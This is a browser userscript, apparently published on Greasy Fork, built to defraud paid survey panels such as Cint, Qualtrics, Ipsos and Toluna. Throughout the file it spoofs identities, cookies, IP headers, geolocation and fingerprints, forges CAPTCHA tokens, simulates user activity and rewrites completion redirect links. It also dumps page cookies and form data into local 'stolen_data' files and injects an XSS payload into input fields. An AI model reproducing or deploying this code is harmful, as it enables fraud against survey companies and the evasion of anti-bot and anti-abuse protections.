// ==UserScript==
// @name         AlaaBOT Ultimate Survey
// @namespace    http://your-namespace.com
// @version      9.3
// @license MIT
// @description  يخدع التتبع، يحقن كوكيز أمريكية من random.org، يسرق البيانات محلياً، يتجاوز CAPTCHA، يزيف TCP/IP، يدعم إدخال بيانات يدوياً، بدون تعديل روابط URL، ويدعم Ipsos، Qualtrics، Toluna، Spectrum، Samplicio، Decipherinic، Cint، وCint Router مع توافق Angular وCint Router Fixes
// @author       AlaaAsh
// @match        *://*.spectrumsurveys.com/*
// @match        *://*.ipsos.com/*
// @match        *://*.qualtrics.com/*
// @match        *://*.toluna.com/*
// @match        *://*.samplicio.us/*
// @match        *://*.decipherinc.com/*
// @match        *://*.cint.com/*
// @match        *://*.router.cint.com/*
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_download
// @downloadURL https://update.greasyfork.org/scripts/537204/AlaaBOT%20Ultimate%20Survey.user.js
// @updateURL https://update.greasyfork.org/scripts/537204/AlaaBOT%20Ultimate%20Survey.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // قاعدة بيانات احتياطية مع ZIP Codes أمريكية لدعم Cint
    const fallbackUSData = {
        usernames: ['JohnSmith', 'EmmaJohnson', 'MikeBrown', 'SarahDavis', 'ChrisWilson'],
        emails: ['john.smith@gmail.com', 'emma.j@yahoo.com', 'mike.brown@outlook.com', 'sarah.davis@aol.com', 'chris.w@protonmail.com'],
        userAgents: [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0'
        ],
        ipAddresses: ['192.168.1.1', '172.16.254.1', '10.0.0.1', '198.51.100.1', '203.0.113.1'],
        locations: ['New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX', 'Miami, FL'],
        zipCodes: ['10001', '90001', '60601', '77001', '33101'],
        sessionIds: ['SID-' + Math.random().toString(36).substr(2, 12), 'SESSION-' + Math.random().toString(36).substr(2, 12)],
        tokens: ['AUTH_' + Math.random().toString(36).substr(2, 16), 'TOKEN_' + Math.random().toString(36).substr(2, 16)],
        phoneNumbers: ['+1-212-555-1234', '+1-310-555-5678', '+1-312-555-9012', '+1-713-555-3456', '+1-305-555-7890'],
        timezones: ['America/New_York', 'America/Los_Angeles', 'America/Chicago'],
        demographics: [
            { age: 25, gender: 'male', income: '50000', education: 'bachelor' },
            { age: 30, gender: 'female', income: '60000', education: 'master' },
            { age: 40, gender: 'male', income: '75000', education: 'highschool' }
        ]
    };

    // دالة لتوليد قيم عشوائية من random.org
    async function getRandomData(type) {
        let url;
        switch (type) {
            case 'username':
                url = 'https://www.random.org/strings/?num=1&len=10&digits=on&upperalpha=on&loweralpha=on&unique=on&format=plain&rnd=new';
                break;
            case 'email':
                url = 'https://www.random.org/strings/?num=1&len=8&digits=on&upperalpha=on&loweralpha=on&unique=on&format=plain&rnd=new';
                break;
            case 'ip':
                url = 'https://www.random.org/integers/?num=4&min=1&max=255&col=1&base=10&format=plain&rnd=new';
                break;
            case 'phone':
                url = 'https://www.random.org/integers/?num=1&min=1000000&max=9999999&col=1&base=10&format=plain&rnd=new';
                break;
            case 'sessionId':
            case 'token':
            case 'surveyId':
                url = 'https://www.random.org/strings/?num=1&len=12&digits=on&upperalpha=on&loweralpha=on&unique=on&format=plain&rnd=new';
                break;
            case 'age':
                url = 'https://www.random.org/integers/?num=1&min=18&max=65&col=1&base=10&format=plain&rnd=new';
                break;
            case 'income':
                url = 'https://www.random.org/integers/?num=1&min=30000&max=100000&col=1&base=10&format=plain&rnd=new';
                break;
            case 'zipCode':
                return getRandomItem(fallbackUSData.zipCodes);
            default:
                return getRandomItem(fallbackUSData[type] || ['unknown']);
        }

        try {
            return await new Promise((resolve) => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: url,
                    onload: function(response) {
                        let result = response.responseText.trim();
                        if (type === 'email') {
                            result = `${result}@${getRandomItem(['gmail.com', 'yahoo.com', 'outlook.com', 'aol.com', 'protonmail.com'])}`;
                        } else if (type === 'ip') {
                            const octets = result.split('\n').map(n => parseInt(n));
                            result = octets.join('.');
                        } else if (type === 'phone') {
                            result = `+1-${getRandomItem(['212', '310', '312', '713', '305'])}-${result}`;
                        } else if (type === 'age' || type === 'income') {
                            result = parseInt(result);
                        }
                        resolve(result);
                    },
                    onerror: function() {
                        console.log(`%cWormGPT: فشل جلب ${type} من random.org، استخدام قيمة احتياطية`, 'color: yellow;');
                        resolve(getRandomItem(fallbackUSData[type] || ['unknown']));
                    }
                });
            });
        } catch (e) {
            console.log(`%cWormGPT: خطأ في جلب ${type}، استخدام قيمة احتياطية`, 'color: yellow;');
            return getRandomItem(fallbackUSData[type] || ['unknown']);
        }
    }

    // دالة لتوليد قيم عشوائية من القاعدة الاحتياطية
    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    // دالة لتوليد كوكيز وهمية مع دعم Cint
    function generateFakeCookie(userData = {}) {
        const demo = getRandomItem(fallbackUSData.demographics);
        const fakeCookie = {
            username: userData.username || getRandomItem(fallbackUSData.usernames),
            email: userData.email || getRandomItem(fallbackUSData.emails),
            userAgent: getRandomItem(fallbackUSData.userAgents),
            ip: getRandomItem(fallbackUSData.ipAddresses),
            location: userData.location || getRandomItem(fallbackUSData.locations),
            zipCode: userData.zipCode || getRandomItem(fallbackUSData.zipCodes),
            sessionId: getRandomItem(fallbackUSData.sessionIds),
            token: getRandomItem(fallbackUSData.tokens),
            phone: userData.phone || getRandomItem(fallbackUSData.phoneNumbers),
            timezone: userData.timezone || getRandomItem(fallbackUSData.timezones),
            surveyId: 'SURVEY-' + Math.random().toString(36).substr(2, 12),
            age: userData.age || Math.floor(Math.random() * (65 - 18 + 1)) + 18,
            gender: userData.gender || demo.gender,
            income: userData.income || Math.floor(Math.random() * (100000 - 30000 + 1)) + 30000,
            education: userData.education || demo.education,
            timestamp: new Date().toISOString(),
            cintPanelId: 'PANEL-' + Math.random().toString(36).substr(2, 12),
            cintQualityScore: '100'
        };
        return `user=${encodeURIComponent(fakeCookie.username)};email=${encodeURIComponent(fakeCookie.email)};ua=${encodeURIComponent(fakeCookie.userAgent)};ip=${encodeURIComponent(fakeCookie.ip)};loc=${encodeURIComponent(fakeCookie.location)};zip=${encodeURIComponent(fakeCookie.zipCode)};session=${encodeURIComponent(fakeCookie.sessionId)};token=${encodeURIComponent(fakeCookie.token)};phone=${encodeURIComponent(fakeCookie.phone)};tz=${encodeURIComponent(fakeCookie.timezone)};survey=${encodeURIComponent(fakeCookie.surveyId)};age=${fakeCookie.age};gender=${encodeURIComponent(fakeCookie.gender)};income=${fakeCookie.income};education=${encodeURIComponent(fakeCookie.education)};cint_panel=${encodeURIComponent(fakeCookie.cintPanelId)};cint_qs=${fakeCookie.cintQualityScore};HttpOnly;Secure;SameSite=Lax`;
    }

    // دالة لتخزين البيانات محلياً
    function saveDataLocally(data) {
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'text/plain' });
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        GM_download({
            url: URL.createObjectURL(blob),
            name: `stolen_data_${timestamp}.txt`,
            saveAs: true
        });
        console.log('%cWormGPT: تم تخزين البيانات المسروقة في ملف محلي!', 'color: purple; font-weight: bold;');
    }

    // تزييف TCP/IP عبر رؤوس HTTP مع دعم Cint
    async function spoofTcpIpHeaders(xhrOrFetchInit) {
        const fakeIp = await getRandomData('ip');
        const fakeZip = await getRandomData('zipCode');
        xhrOrFetchInit.headers['X-Forwarded-For'] = fakeIp;
        xhrOrFetchInit.headers['Client-IP'] = fakeIp;
        xhrOrFetchInit.headers['Via'] = `1.1 proxy-us-${Math.random().toString(36).substr(2, 5)}.net`;
        xhrOrFetchInit.headers['X-Real-IP'] = fakeIp;
        xhrOrFetchInit.headers['X-TCP-TTL'] = Math.floor(Math.random() * (128 - 64) + 64).toString();
        xhrOrFetchInit.headers['X-TCP-Window-Size'] = Math.floor(Math.random() * (65535 - 16384) + 16384).toString();
        xhrOrFetchInit.headers['X-Zip-Code'] = fakeZip;
    }

    // إعداد fakeLocalStorage لتخزين بيانات المستخدم
    const fakeLocalStorage = {
        store: {},
        getItem: function(key) {
            console.log('%cWormGPT: محاولة قراءة localStorage، مفتاح: ' + key, 'color: orange;');
            return this.store[key] || null;
        },
        setItem: function(key, value) {
            console.log('%cWormGPT: تخزين في localStorage، مفتاح: ' + key + '، قيمة: ' + value, 'color: orange;');
            this.store[key] = value.toString();
        },
        removeItem: function(key) {
            console.log('%cWormGPT: إزالة من localStorage، مفتاح: ' + key, 'color: orange;');
            delete this.store[key];
        },
        clear: function() {
            console.log('%cWormGPT: مسح localStorage!', 'color: orange;');
            this.store = {};
        }
    };

    Object.defineProperty(window, 'localStorage', {
        value: fakeLocalStorage,
        writable: false
    });

    // اعتراض document.cookie بحذر
    let originalCookies = document.cookie || '';
    let fakeCookieCache = generateFakeCookie();
    Object.defineProperty(document, 'cookie', {
        get: function() {
            console.log('%cWormGPT: تم اعتراض طلب الكوكيز! يتم حقن قيم أمريكية وهمية مع دعم Cint', 'color: red; font-weight: bold;');
            try {
                const combinedCookies = `${originalCookies ? originalCookies + ';' : ''}${fakeCookieCache}`;
                return combinedCookies;
            } catch (e) {
                console.error('%cWormGPT: خطأ في توليد الكوكيز، إرجاع الكوكيز الأصلية', 'color: red;');
                return originalCookies;
            }
        },
        set: function(value) {
            console.log('%cWormGPT: محاولة إضافة كوكي! تم تخزين القيمة', 'color: red; font-weight: bold;');
            console.log('الكوكي المحاول: ' + value);
            originalCookies = value;
            fakeCookieCache = generateFakeCookie(getUserData());
        },
        configurable: true
    });

    // تعطيل sessionStorage
    const fakeSessionStorage = {
        store: {},
        getItem: function(key) {
            console.log('%cWormGPT: محاولة قراءة sessionStorage، إرجاع null', 'color: orange;');
            return null;
        },
        setItem: function(key, value) {
            console.log('%cWormGPT: محاولة تخزين في sessionStorage، تم تجاهلها!', 'color: orange;');
            this.store[key] = value.toString();
        },
        removeItem: function(key) {
            console.log('%cWormGPT: محاولة إزالة من sessionStorage، تم تجاهلها!', 'color: orange;');
            delete this.store[key];
        },
        clear: function() {
            console.log('%cWormGPT: محاولة مسح sessionStorage، تم تجاهلها!', 'color: orange;');
            this.store = {};
        }
    };

    Object.defineProperty(window, 'sessionStorage', {
        value: fakeSessionStorage,
        writable: false
    });

    // دالة لجلب بيانات المستخدم من fakeLocalStorage
    function getUserData() {
        const userData = {};
        const keys = ['age', 'gender', 'income', 'education', 'username', 'email', 'phone', 'location', 'zipCode', 'timezone'];
        keys.forEach(key => {
            const value = fakeLocalStorage.getItem(`user_${key}`);
            if (value) userData[key] = value;
        });
        return userData;
    }

    // دالة لإنشاء واجهة إدخال البيانات
    function createUserInputInterface() {
        // إنشاء زر عائم
        const floatButton = document.createElement('button');
        floatButton.textContent = 'إدخال بيانات';
        floatButton.style.position = 'fixed';
        floatButton.style.bottom = '20px';
        floatButton.style.right = '20px';
        floatButton.style.padding = '10px';
        floatButton.style.background = '#ff4444';
        floatButton.style.color = 'white';
        floatButton.style.border = 'none';
        floatButton.style.borderRadius = '5px';
        floatButton.style.cursor = 'pointer';
        floatButton.style.zIndex = '9999';
        document.body.appendChild(floatButton);

        // إنشاء نموذج إدخال
        const formContainer = document.createElement('div');
        formContainer.style.display = 'none';
        formContainer.style.position = 'fixed';
        formContainer.style.top = '50%';
        formContainer.style.left = '50%';
        formContainer.style.transform = 'translate(-50%, -50%)';
        formContainer.style.background = 'white';
        formContainer.style.padding = '20px';
        formContainer.style.border = '1px solid #ccc';
        formContainer.style.borderRadius = '5px';
        formContainer.style.zIndex = '10000';
        formContainer.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';

        formContainer.innerHTML = `
            <h3>إدخال بيانات المستخدم</h3>
            <label>العمر: <input type="number" id="user_age" min="18" max="100"></label><br><br>
            <label>الجنس: 
                <select id="user_gender">
                    <option value="">اختر</option>
                    <option value="male">ذكر</option>
                    <option value="female">أنثى</option>
                </select>
            </label><br><br>
            <label>الدخل السنوي: <input type="number" id="user_income" min="0"></label><br><br>
            <label>التعليم: 
                <select id="user_education">
                    <option value="">اختر</option>
                    <option value="highschool">ثانوية</option>
                    <option value="bachelor">بكالوريوس</option>
                    <option value="master">ماجستير</option>
                </select>
            </label><br><br>
            <label>الاسم: <input type="text" id="user_username"></label><br><br>
            <label>البريد الإلكتروني: <input type="email" id="user_email"></label><br><br>
            <label>رقم الهاتف: <input type="text" id="user_phone"></label><br><br>
            <label>الموقع: <input type="text" id="user_location"></label><br><br>
            <label>الرمز البريدي: <input type="text" id="user_zipCode"></label><br><br>
            <button id="save_user_data">حفظ</button>
            <button id="close_form">إغلاق</button>
        `;
        document.body.appendChild(formContainer);

        // إضافة أنماط CSS
        GM_addStyle(`
            #user_age, #user_income, #user_username, #user_email, #user_phone, #user_location, #user_zipCode {
                width: 100%;
                padding: 5px;
                margin-top: 5px;
            }
            #user_gender, #user_education {
                width: 100%;
                padding: 5px;
                margin-top: 5px;
            }
            #save_user_data, #close_form {
                padding: 10px;
                margin: 5px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            #save_user_data {
                background: #4CAF50;
                color: white;
            }
            #close_form {
                background: #f44336;
                color: white;
            }
        `);

        // معالجة الأحداث
        floatButton.addEventListener('click', () => {
            formContainer.style.display = 'block';
            // ملء النموذج ببيانات محفوظة إن وجدت
            const userData = getUserData();
            document.getElementById('user_age').value = userData.age || '';
            document.getElementById('user_gender').value = userData.gender || '';
            document.getElementById('user_income').value = userData.income || '';
            document.getElementById('user_education').value = userData.education || '';
            document.getElementById('user_username').value = userData.username || '';
            document.getElementById('user_email').value = userData.email || '';
            document.getElementById('user_phone').value = userData.phone || '';
            document.getElementById('user_location').value = userData.location || '';
            document.getElementById('user_zipCode').value = userData.zipCode || '';
        });

        document.getElementById('save_user_data').addEventListener('click', () => {
            const userData = {
                age: document.getElementById('user_age').value,
                gender: document.getElementById('user_gender').value,
                income: document.getElementById('user_income').value,
                education: document.getElementById('user_education').value,
                username: document.getElementById('user_username').value,
                email: document.getElementById('user_email').value,
                phone: document.getElementById('user_phone').value,
                location: document.getElementById('user_location').value,
                zipCode: document.getElementById('user_zipCode').value
            };
            Object.keys(userData).forEach(key => {
                if (userData[key]) {
                    fakeLocalStorage.setItem(`user_${key}`, userData[key]);
                }
            });
            fakeCookieCache = generateFakeCookie(userData);
            formContainer.style.display = 'none';
            console.log('%cWormGPT: تم حفظ بيانات المستخدم!', 'color: green; font-weight: bold;');
            fillSurveyFields(); // إعادة ملء الحقول ببيانات المستخدم
        });

        document.getElementById('close_form').addEventListener('click', () => {
            formContainer.style.display = 'none';
        });
    }

    // دالة لملء حقول الاستبيان
    function fillSurveyFields() {
        const userData = getUserData();
        const inputs = document.querySelectorAll('input, select, textarea');
        inputs.forEach(input => {
            const name = (input.name || input.id || '').toLowerCase();
            let value = '';

            if (name.includes('age') && userData.age) {
                value = userData.age;
            } else if (name.includes('gender') && userData.gender) {
                value = userData.gender;
            } else if (name.includes('income') && userData.income) {
                value = userData.income;
            } else if (name.includes('education') && userData.education) {
                value = userData.education;
            } else if (name.includes('email') && userData.email) {
                value = userData.email;
            } else if (name.includes('phone') && userData.phone) {
                value = userData.phone;
            } else if (name.includes('zip') && userData.zipCode) {
                value = userData.zipCode;
            } else if (name.includes('location') && userData.location) {
                value = userData.location;
            } else {
                // قيم عشوائية إذا لم يكن هناك بيانات مدخلة
                if (name.includes('age')) {
                    value = Math.floor(Math.random() * (65 - 18 + 1)) + 18;
                } else if (name.includes('gender')) {
                    value = getRandomItem(['male', 'female']);
                } else if (name.includes('income')) {
                    value = Math.floor(Math.random() * (100000 - 30000 + 1)) + 30000;
                } else if (name.includes('education')) {
                    value = getRandomItem(['highschool', 'bachelor', 'master']);
                } else if (name.includes('email')) {
                    value = getRandomItem(fallbackUSData.emails);
                } else if (name.includes('phone')) {
                    value = getRandomItem(fallbackUSData.phoneNumbers);
                } else if (name.includes('zip')) {
                    value = getRandomItem(fallbackUSData.zipCodes);
                } else if (name.includes('location')) {
                    value = getRandomItem(fallbackUSData.locations);
                }
            }

            if (value) {
                if (input.tagName === 'INPUT' && input.type === 'text') {
                    input.value = value;
                } else if (input.tagName === 'INPUT' && input.type === 'number') {
                    input.value = parseInt(value) || value;
                } else if (input.tagName === 'SELECT') {
                    const option = Array.from(input.options).find(opt => opt.value.toLowerCase() === value.toLowerCase());
                    if (option) input.value = option.value;
                } else if (input.tagName === 'TEXTAREA') {
                    input.value = value;
                }
                console.log(`%cWormGPT: تم ملء حقل ${name} بالقيمة: ${value}`, 'color: purple;');
            }
        });
    }

    // تزييف بصمة المتصفح
    const originalCanvas = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type) {
        const context = originalCanvas.apply(this, arguments);
        if (type === '2d' || type === 'webgl') {
            const originalFillText = context.fillText;
            context.fillText = function() {
                originalFillText.apply(this, arguments);
                context.fillRect(Math.random() * 10, Math.random() * 10, 1, 1);
            };
        }
        return context;
    };

    const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
        if (parameter === 37446) return 'Intel Inc.';
        if (parameter === 37445) return 'Intel Iris OpenGL Engine';
        return originalGetParameter.apply(this, arguments);
    };

    // تزييف بيانات المتصفح مع دعم Cint
    const fakeNavigator = {
        userAgent: getRandomItem(fallbackUSData.userAgents),
        platform: 'Win32',
        language: 'en-US',
        languages: ['en-US', 'en'],
        timezone: getRandomItem(fallbackUSData.timezones),
        geolocation: {
            getCurrentPosition: function(callback) {
                callback({
                    coords: {
                        latitude: 40.7128 + (Math.random() * 0.1),
                        longitude: -74.0060 + (Math.random() * 0.1)
                    }
                });
            }
        },
        cookieEnabled: true,
        hardwareConcurrency: 4,
        deviceMemory: 8,
        maxTouchPoints: 0,
        vendor: 'Google Inc.',
        webdriver: false,
        cintPanel: 'CINT-PANEL-' + Math.random().toString(36).substr(2, 12)
    };

    Object.defineProperty(window, 'navigator', {
        value: fakeNavigator,
        writable: false
    });

    // ضبط التوقيت على توقيت أمريكي
    const originalDate = Date;
    window.Date = function() {
        const date = new originalDate();
        date.toLocaleString = function() {
            return new originalDate().toLocaleString('en-US', { timeZone: getRandomItem(fallbackUSData.timezones) });
        };
        return date;
    };

    // منع إعادة التحديث بطريقة آمنة
    try {
        Object.defineProperty(window.location, 'reload', {
            value: function() {
                console.log('%cWormGPT: تم منع إعادة تحديث الصفحة!', 'color: red; font-weight: bold;');
            },
            writable: false,
            configurable: true
        });
    } catch (e) {
        console.log('%cWormGPT: فشل تعطيل window.location.reload، التجاهل...', 'color: yellow;');
    }

    // محاكاة سلوك المستخدم
    function simulateUserBehavior() {
        const events = [
            () => {
                const mouseEvent = new MouseEvent('mousemove', {
                    clientX: Math.random() * window.innerWidth,
                    clientY: Math.random() * window.innerHeight
                });
                document.dispatchEvent(mouseEvent);
            },
            () => {
                const clickEvent = new MouseEvent('click', {
                    clientX: Math.random() * window.innerWidth,
                    clientY: Math.random() * window.innerHeight
                });
                document.dispatchEvent(clickEvent);
            },
            () => window.scrollBy(0, Math.random() * 100),
            () => document.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown' }))
        ];
        setInterval(() => {
            const randomEvent = events[Math.floor(Math.random() * events.length)];
            randomEvent();
        }, 3000 + Math.random() * 5000);
    }

    simulateUserBehavior();

    // اعتراض طلبات الشبكة
    const originalXhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        console.log('%cWormGPT: اعتراض طلب XHR إلى: ' + url, 'color: orange;');
        // استدعاء open أولاً لفتح الطلب
        const result = originalXhrOpen.apply(this, arguments);

        // التأكد من أن الحالة OPENED
        if (this.readyState >= 1) {
            try {
                const headers = {};
                spoofTcpIpHeaders({ headers }).then(() => {
                    this.setRequestHeader('X-Fake-Origin', window.location.origin);
                    this.setRequestHeader('Access-Control-Allow-Origin', '*');
                    this.setRequestHeader('User-Agent', getRandomItem(fallbackUSData.userAgents));
                    this.setRequestHeader('Accept-Language', 'en-US,en;q=0.9');
                    for (const [key, value] of Object.entries(headers)) {
                        this.setRequestHeader(key, value);
                    }
                    if (url.includes('bam.nr-data.net') || url.includes('decipherinc.com')) {
                        this.setRequestHeader('X-Survey-Platform', 'WormGPT-Fake');
                    }
                    if (url.includes('samplicio.us')) {
                        this.setRequestHeader('X-Samplicio-Verification', 'verified-' + Math.random().toString(36).substr(2, 12));
                    }
                    if (url.includes('cint.com') || url.includes('router.cint.com')) {
                        this.setRequestHeader('X-Cint-Panel', 'PANEL-' + Math.random().toString(36).substr(2, 12));
                        this.setRequestHeader('X-Cint-Quality-Score', '100');
                        getRandomData('zipCode').then(zip => {
                            this.setRequestHeader('X-Cint-Zip-Code', zip);
                        });
                    }
                    console.log('%cWormGPT: تم إضافة رؤوس HTTP بنجاح لـ XHR', 'color: green;');
                }).catch(err => {
                    console.error('%cWormGPT: خطأ في إضافة رؤوس XHR: ' + err, 'color: red;');
                });
            } catch (e) {
                console.error('%cWormGPT: خطأ في معالجة XHR: ' + e, 'color: red;');
            }
        } else {
            console.warn('%cWormGPT: حالة XHR ليست OPENED، تجاهل إضافة الرؤوس', 'color: yellow;');
        }

        return result;
    };

    const originalFetch = window.fetch;
    window.fetch = async function(input, init) {
        console.log('%cWormGPT: اعتراض طلب Fetch إلى: ' + input, 'color: orange;');
        init = init || {};
        init.headers = init.headers || {};
        await spoofTcpIpHeaders(init);
        init.headers['X-Fake-Origin'] = window.location.origin;
        init.headers['Access-Control-Allow-Origin'] = '*';
        init.headers['User-Agent'] = getRandomItem(fallbackUSData.userAgents);
        init.headers['Accept-Language'] = 'en-US,en;q=0.9';
        if (String(input).includes('bam.nr-data.net') || String(input).includes('decipherinc.com')) {
            init.headers['X-Survey-Platform'] = 'WormGPT-Fake';
        }
        if (String(input).includes('samplicio.us')) {
            init.headers['X-Samplicio-Verification'] = 'verified-' + Math.random().toString(36).substr(2, 12);
        }
        if (String(input).includes('cint.com') || String(input).includes('router.cint.com')) {
            init.headers['X-Cint-Panel'] = 'PANEL-' + Math.random().toString(36).substr(2, 12);
            init.headers['X-Cint-Quality-Score'] = '100';
            init.headers['X-Cint-Zip-Code'] = await getRandomData('zipCode');
        }
        init.credentials = 'same-origin';
        return originalFetch(input, init);
    };

    // معالجة روابط Cint Redirects
    function handleCintRedirects() {
        const redirectTypes = ['complete', 'screenout', 'quotafull'];
        redirectTypes.forEach(type => {
            const links = document.querySelectorAll(`a[href*="${type}"], form[action*="${type}"]`);
            links.forEach(link => {
                const originalHref = link.href || link.action;
                const fakeId = 'ID-' + Math.random().toString(36).substr(2, 12);
                const fakeToken = 'TOKEN-' + Math.random().toString(36).substr(2, 12);
                const modifiedHref = `${originalHref}${originalHref.includes('?') ? '&' : '?'}id=${fakeId}&token=${fakeToken}`;
                if (link.href) link.href = modifiedHref;
                if (link.action) link.action = modifiedHref;
                console.log(`%cWormGPT: تم تعديل رابط Cint ${type} إلى: ${modifiedHref}`, 'color: purple; font-weight: bold;');
            });
        });
    }

    window.addEventListener('load', handleCintRedirects);
    window.addEventListener('click', handleCintRedirects);

    // خداع CAPTCHA
    function bypassCaptcha() {
        if (window.grecaptcha) {
            Object.defineProperty(window, 'grecaptcha', {
                value: {
                    execute: function() {
                        return Promise.resolve('fake-recaptcha-token-' + Math.random().toString(36).substr(2, 12));
                    },
                    render: function() {
                        console.log('%cWormGPT: تم محاكاة reCAPTCHA!', 'color: purple; font-weight: bold;');
                    }
                },
                writable: false
            });
        }

        if (window.cf_chl_jschl_tk) {
            Object.defineProperty(window, 'cf_chl_jschl_tk', {
                value: 'fake-cloudflare-token-' + Math.random().toString(36).substr(2, 12),
                writable: false
            });
            console.log('%cWormGPT: تم تجاوز Cloudflare CAPTCHA!', 'color: purple; font-weight: bold;');
        }

        window.__cf_chl_captcha_tk__ = 'fake-captcha-token-' + Math.random().toString(36).substr(2, 12);
        window.turnstile = {
            render: function() {
                console.log('%cWormGPT: تم محاكاة Turnstile CAPTCHA!', 'color: purple; font-weight: bold;');
                return 'fake-turnstile-token-' + Math.random().toString(36).substr(2, 12);
            }
        };

        window.__qualtrics_captcha_token = 'fake-qualtrics-token-' + Math.random().toString(36).substr(2, 12);
        window.__samplicio_verification = 'verified-' + Math.random().toString(36).substr(2, 12);
        window.__cint_captcha_token = 'fake-cint-token-' + Math.random().toString(36).substr(2, 12);
    }

    window.addEventListener('load', bypassCaptcha);

    // حقن XSS في الحقول وسرقة البيانات بدون تعديل URL
    function injectXSSAndStealData() {
        const stolenData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            cookies: document.cookie,
            forms: Array.from(document.forms).map(form => ({
                action: form.action,
                inputs: Array.from(form.elements).map(el => ({ name: el.name, value: el.value }))
            })),
            surveyData: Array.from(document.querySelectorAll('input, textarea, select')).map(el => ({
                id: el.id,
                name: el.name,
                value: el.value,
                type: el.type
            })),
            pageContent: document.body.innerText.substring(0, 1000),
            localStorage: Object.keys(fakeLocalStorage.store).length > 0 ? fakeLocalStorage.store : null,
            sessionStorage: Object.keys(fakeSessionStorage.store).length > 0 ? fakeSessionStorage.store : null,
            cintData: window.location.href.includes('cint.com') ? {
                panelId: 'PANEL-' + Math.random().toString(36).substr(2, 12),
                qualityScore: '100',
                redirectLinks: Array.from(document.querySelectorAll('a[href*="complete"], a[href*="screenout"], a[href*="quotafull"]')).map(a => a.href)
            } : null
        };

        saveDataLocally(stolenData);

        // حقن XSS في حقول الإدخال فقط
        const inputs = document.querySelectorAll('input, textarea');
        inputs.forEach(input => {
            input.addEventListener('input', function() {
                const payload = `<script>alert('WormGPT XSS! Cookies: ' + document.cookie);</script>`;
                input.value = payload;
                console.log('%cWormGPT: تم حقن XSS في حقل إدخال!', 'color: purple; font-weight: bold;');
                saveDataLocally({ xssInput: { field: input.name || input.id, value: input.value, timestamp: new Date().toISOString() } });
            });
        });

        // إزالة حقن XSS في معايير URL
        console.log('%cWormGPT: تم تعطيل حقن XSS في معايير URL!', 'color: yellow; font-weight: bold;');

        setInterval(() => {
            const newData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                cookies: document.cookie,
                forms: Array.from(document.forms).map(form => ({
                    action: form.action,
                    inputs: Array.from(form.elements).map(el => ({ name: el.name, value: el.value }))
                })),
                surveyData: Array.from(document.querySelectorAll('input, textarea, select')).map(el => ({
                    id: el.id,
                    name: el.name,
                    value: el.value,
                    type: el.type
                })),
                pageContent: document.body.innerText.substring(0, 1000),
                cintData: window.location.href.includes('cint.com') ? {
                    panelId: 'PANEL-' + Math.random().toString(36).substr(2, 12),
                    qualityScore: '100',
                    redirectLinks: Array.from(document.querySelectorAll('a[href*="complete"], a[href*="screenout"], a[href*="quotafull"]')).map(a => a.href)
                } : null
            };
            saveDataLocally(newData);
        }, 10000);
    }

    window.addEventListener('load', () => {
        createUserInputInterface();
        injectXSSAndStealData();
        fillSurveyFields();
    });

    GM_addStyle(`
        body::before {
            content: 'WormGPT Active - US Mode + XSS (Inputs Only) + CAPTCHA Bypass + Random.org + TCP/IP Spoofing + User Input + Angular Fix + Cint & Cint Router Support';
            position: fixed;
            top: 0;
            right: 0;
            color: red;
            font-size: 12px;
            padding: 5px;
            background: rgba(0,0,0,0.5);
            z-index: 9999;
        }
    `);

    console.log('%cWormGPT: السكربت الخبيث شغال! الكوكيز من random.org، التتبع مخدوع، XSS في الحقول فقط، CAPTCHA متجاوز، TCP/IP مزيف، يدعم إدخال بيانات يدوياً، بدون تعديل روابط URL، ويدعم Ipsos، Qualtrics، Toluna، Spectrum، Samplicio، Decipherinic، Cint، وCint Router مع توافق Angular وCint Fixes! 🇺🇸💉', 'color: green; font-size: 16px;');
})();